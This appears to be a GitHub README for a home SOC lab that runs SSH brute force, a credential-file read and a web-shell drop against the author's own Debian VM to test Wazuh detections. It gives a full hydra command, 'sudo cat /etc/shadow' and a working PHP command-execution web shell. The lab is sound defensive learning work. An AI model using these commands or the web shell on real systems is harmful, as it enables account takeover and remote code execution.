# SIEM Homelab — Cyber Attack Simulation & Log Analysis (SOC Lab)

**Author:** Emran  
**Project type:** Self-built home lab / Blue Team security project  
**Stack:** Proxmox VE · Wazuh 4.14 (Indexer / Manager / Dashboard) · Kali Linux · Debian  
**Focus:** Detection, log analysis, and attack simulation in a closed lab

---

## 1. Summary

I built a SIEM from scratch on an old laptop. SIEM stands for Security Information and Event Management — basically a system that collects logs and spots attacks.

I turned the laptop into a server with Proxmox and ran three machines on it: the SIEM, a victim (Debian), and an attacker (Kali Linux).

I didn't just want to install a tool, i also wanted to see the full picture. Like how an attack creates events, how those events travel to the SIEM, how the SIEM turns them into alerts, and how you read those alerts.
**note:** My name is intentionally not disclosed for operational security reasons.

![The lab running on my laptop](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20183628.png)

I tested three types of detection:

1. **Log-based detection** — SSH brute force
2. **Correlation-based detection** — a successful login after many failed ones (= hacked account)
3. **File-based detection** — a web shell dropped on a web server

> **Honest note:** My first build didn't work. I messed up the TLS certificates for the Wazuh Indexer. Instead of hacking around it, I deleted everything and started over the right way. I wrote this down on purpose — knowing when to start fresh is a real skill.

---

## 2. Lab Architecture

Everything runs on one Proxmox server (the old laptop). I access it from my PC through the browser.

| Role | Hostname | IP | What it does |
|------|----------|-----|--------------|
| **SIEM server** | `wazuh-siem` | `192.168.2.90` | Wazuh Indexer + Manager + Dashboard |
| **Victim** | `debian` | `192.168.2.87` | The machine being monitored: Wazuh agent, SSH, Apache/PHP |
| **Attacker** | `kali` | `192.168.2.88` | Kali Linux — all attacks come from here |

**How the data flows:**

```
[Kali attacker] --attack--> [Debian victim]
                                   |
                          (Wazuh agent picks up events)
                                   |  ports 1514/1515
                                   v
                          [Wazuh Manager] --checks rules--> alerts.json
                                   |
                              (Filebeat sends over TLS, port 9200)
                                   v
                          [Wazuh Indexer] --stores events--> wazuh-alerts-*
                                   |
                                   v
                          [Wazuh Dashboard] --shows alerts--> SOC analyst
```

![Proxmox dashboard with VMs](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20004136.png)

### How the parts work together

- The **agent** on the victim just collects events. It doesn't decide what's an attack.
- The **Manager** has the rules. It decides what's suspicious.
- **Filebeat** sends the alerts to the Indexer over a secure connection (TLS).
- The **Indexer** stores everything. The **Dashboard** shows it.

---

## 3. How I Built It

### 3.1 Setting up the host

The SIEM runs in an LXC container on Proxmox. The Indexer needs a specific setting (`vm.max_map_count`) to work. Because it's a container, I had to set this on the Proxmox host itself:

```bash
# On the Proxmox host
sysctl -w vm.max_map_count=262144
echo "vm.max_map_count=262144" >> /etc/sysctl.conf
```

Without this, the Indexer just doesn't start.

### 3.2 Certificates

This was the hardest part. Wazuh uses TLS certificates so all the parts communicate securely. I used the official tool `wazuh-certs-tool.sh` to generate all certificates at once:

```yaml
nodes:
  indexer:
    - name: node-1
      ip: "192.168.2.90"
  server:
    - name: wazuh-1
      ip: "192.168.2.90"
  dashboard:
    - name: dashboard
      ip: "192.168.2.90"
```

This created a certificate for the indexer, the server, the dashboard, and a separate admin certificate. All signed by the same root CA. Generating them all at once is what fixed the problem from my first try.

![wazuh-certs-tool.sh generating certificates](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20013307.png)

### 3.3 Installing the parts

I installed each part from the official Wazuh repo (version 4.14.5):

1. **Indexer** — installed it, added the certificates, ran `indexer-security-init.sh`. Cluster health came back `green`.
2. **Manager + Filebeat** — installed both. Set up Filebeat with the server certificate. Password goes in the keystore, not in plain text. Tested the connection with `filebeat test output`.
3. **Dashboard** — installed and connected to the Indexer (for data) and the Manager API (to manage agents).

![filebeat test output](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20012847.png)
![Wazuh Dashboard first login](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20125619.png)

### 3.4 Installing the agent

I installed the Wazuh agent on the Debian victim. It registered with the Manager automatically. Status: `Active`.

```bash
# On the Manager
/var/ossec/bin/agent_control -l
#   ID: 001, Name: debian, IP: any, Active
```

![agent_control showing debian as Active](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20135535.png)

---

## 4. Attacks and Detections

All attacks go from Kali (`192.168.2.88`) to the Debian victim (`192.168.2.87`). This is my own closed lab — everything runs on machines I own.

### Phase 1 — SSH Brute Force (log-based)

**Attack (from Kali):**
```bash
hydra -l emran -P /tmp/passwords.txt ssh://192.168.2.87 -t 4 -V
```
Hydra tries a bunch of passwords on SSH.

**What Wazuh saw:**

Wazuh didn't just log each failed login separately. It linked them together and raised the alert level:

| Rule ID | Description | Level |
|---------|-------------|-------|
| 5760 | sshd: authentication failed | 5 |
| 2501 | syslog: user authentication failure | 5 |
| 5758 | Maximum authentication attempts exceeded | 8 |
| 2502 | User missed the password more than one time | 10 |
| **40111** | **Multiple authentication failures** | **10** |

![Threat Hunting dashboard with 282 failed logins](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20140804.png)
![Events view showing levels 5 to 10](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20142230.png)

**What this means:** Rule **40111** is the important one. Wazuh saw many failed logins from one IP and flagged it as an attack. I added `data.srcip` as a column and saw every failed attempt came from `192.168.2.88`. That's not someone forgetting their password — that's a brute force attack. **MITRE ATT&CK: T1110 (Brute Force).**

### Phase 2 — Successful Break-In (correlation-based)

**Attack (from Kali):** I put a weak password (`password123`) in the list. Hydra found it:

```
[22][ssh] host: 192.168.2.87   login: emran   password: password123
1 of 1 target successfully completed, 1 valid password found
```

After getting in, I did what an attacker would do:

```bash
whoami; id; uname -a; cat /etc/passwd     # looking around
sudo cat /etc/shadow                       # trying to get root (blocked)
```

**What Wazuh saw:**

| Rule ID | Description | Level |
|---------|-------------|-------|
| 5715 | sshd: authentication success | 3 |
| **40112** | **Multiple authentication failures followed by a success** | **12** |

![Hydra output with cracked password](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20144141.png)
![Events view rule 40112 - failures followed by success](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20144418.png)

**What this means:** Rule **40112** is the strongest alert in the whole project. It saw many failed logins followed by a successful one, all from the same IP. That's level **12** — a sign of a compromised account. A normal login is not suspicious but a login right after 200 failed tries from the same IP is. Also the commands I ran after logging in (`whoami`, `cat /etc/passwd`) didn't trigger any alerts. Not everything gets detected by default. The `sudo cat /etc/shadow` attempt did get caught though. **MITRE ATT&CK: T1110 → T1078 (Valid Accounts).**

### Phase 3 — Web Shell

For this one I installed Apache + PHP on the victim and turned on real time File Integrity Monitoring on the web folder:

```xml
<directories check_all="yes" realtime="yes" report_changes="yes">/var/www/html</directories>
```

**Attack:** I dropped a PHP web shell in the web folder:

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

**What Wazuh saw:**

| Rule ID | Description | Level |
|---------|-------------|-------|
| 554 | File added to the system | 5 |
| 550 | Integrity checksum changed | 7 |

![Events view rule 554 - File added to system](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20154315.png)
![Alert showing file path and PHP code](https://raw.githubusercontent.com/spgtcat/siem-homelab/main/Screenshot%202026-06-07%20155004.png)

**What this means:** This detection works differently from Phase 1 and 2. FIM watches files in real time. The moment a new file appears in a watched folder, it makes an alert. Because I turned on `report_changes`, the alert even shows the actual PHP code. A random `.php` file showing up on a web server is a webshell, it lets an attacker run commands remotely. **MITRE ATT&CK: T1505.003 (Web Shell).**

---

## 5. The Full Attack Chain

All three phases together tell one story. This is how a real break-in goes:

```
1. Brute force        (T1110)        -> many failed SSH logins        [rule 40111, level 10]
2. Break-in           (T1078)        -> weak password cracked          [rule 40112, level 12]
3. Looking around     (T1082/T1087)  -> system & account discovery     [partly detected]
4. Try to get root    (T1548)        -> tried to read /etc/shadow      [detected]
5. Web shell          (T1505.003)    -> bad file dropped in web folder [rule 554/550]
```

---

## 6. Problems and Lessons

**The certificate problem.** My first build kept failing. I got the error `"... is not an admin user"` when trying to start the Indexer security. Turns out I was using a node certificate as the admin certificate. OpenSearch doesn't allow that — a node certificate can never be an admin. That's a security feature.

**How I fixed it.** I didn't try to patch the broken setup. I just deleted everything and started fresh with the official tool. Clean build worked first try — `Done with success`.

**What I learned:**

- It's better to understand *why* something blocks you than to force past it.
- Alerts have layers: single events → linked alerts → higher priority. The linked alerts (40111, 40112) are where the real detection happens.
- Not everything gets detected by default. Knowing the blind spots matters too.
- Starting over is sometimes faster and cleaner than fixing a mess.

---

## 7. What I Could Add Next

- **Custom rules** — make the SIEM recognize web shell code (`system(`, `$_GET`, `eval(`) and flag it as critical.
- **auditd** — log every command so the "looking around" phase also gets detected.
- **Active Response** — automatically block an attacker's IP.
- **Sysmon + a Windows machine** — more detailed logs and different attack types.
- **Change default passwords** — rotate the default `admin` password. The lab is on a closed network so it wasn't urgent, but it's good practice.

---

## 8. Skills I Showed

- Built a full SIEM stack (Wazuh Indexer, Manager, Dashboard) from scratch
- Worked with TLS certificates to secure connections
- Linux server admin (Debian, systemd, packages)
- Installed agents and monitored a machine
- Ran attacks with real tools (Hydra, Kali Linux)
- Read logs, analyzed alerts, and understood how detection rules link events together
- Mapped detections to MITRE ATT&CK
- Troubleshot problems and fixed them the right way

---

*I built and ran this lab only on my own machines, on a closed network, to learn.*
